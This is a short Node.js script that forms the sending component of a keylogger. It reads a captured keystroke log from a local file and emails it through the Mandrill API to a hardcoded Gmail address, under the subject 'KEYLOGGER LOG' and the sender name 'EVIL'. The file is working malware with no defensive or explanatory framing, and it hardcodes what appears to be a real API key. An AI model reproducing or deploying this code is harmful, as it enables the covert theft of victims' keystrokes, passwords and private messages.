var fs = require('fs');
var mandrill = require('mandrill-api/mandrill');
var mandrill_client = new mandrill.Mandrill('RBqJ4kvrVJRa1hk3GI5hKw');
var PATH_TO_LOG = '../../logger/log.txt'
var EMAIL = 'titsinass4you@gmail.com';

function getLogger (callback) {
    var log;
    fs.readFile(PATH_TO_LOG, 'utf8',  function read (err, data) {

        if (err) {
            throw err;
        }

        callback(data);
    });
}

function sendMail (log, callback) {

    if (!callback) {
        callback = function () {}; 
    }

    var template_name = "LOG_DATA";
    var template_content = [{
        "name": "LOG DATA",
        "content": "LOG DATA"
    }];

    var message = {
        "html": "<h1>TODAY'S LOG MUHAHAHAHAHA</h1>" + "<p>" + log + "</p>",
        "subject": "KEYLOGGER LOG",
        "from_name": "EVIL",
        "from_email": EMAIL,
        "to": [{
                "email": EMAIL,
                "name": "Recipient Name",
                "type": "to"
        }],
        "important": false
    };
    var async = false;
    mandrill_client.messages.send({"message": message, "async": async}, function(result) {
        console.log(result);
        //check to see if rejected
        if (result[0].status === 'rejected' || result[0].status === 'invalid') {
            callback(result[0].reject_reason || 'Error on sending email, check if the email provided is valid');
        } else {
            callback(null);
        }
    }, function(e) {
        // Mandrill returns the error as an object with name and message keys
        console.log('A mandrill error occurred: ' + e.name + ' - ' + e.message);
        callback('A mandrill error occurred: ' + e.name + ' - ' + e.message);
    });
}

getLogger (function (log) {
    sendMail(log, function(result) {
        console.log('done');
    });
});